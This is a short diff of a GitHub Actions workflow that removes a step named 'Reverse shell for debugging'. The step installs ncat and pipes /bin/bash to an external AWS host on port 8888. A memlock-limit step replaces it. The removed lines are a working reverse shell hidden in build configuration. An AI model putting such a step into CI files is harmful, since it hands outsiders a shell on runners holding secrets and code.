@@ -114,12 +114,9 @@ jobs:
         uses: actions/setup-go@v4
         with:
           go-version: "1.25"
-      - name: Reverse shell for debugging
+      - name: Set unlimited memlock limit
         run: |
-          sudo apt-get update
-          sudo apt-get install -y ncat
-          echo "Opening reverse shell for debugging to ec2-35-177-146-80.eu-west-2.compute.amazonaws.com:8888"
-          ncat -e /bin/bash ec2-35-177-146-80.eu-west-2.compute.amazonaws.com 8888
+          sudo ulimit -l unlimited
       - name: Run test
         run: |
           cd tests && go test -v ./... -run ${{ matrix.test }} --timeout=20m --tags=component
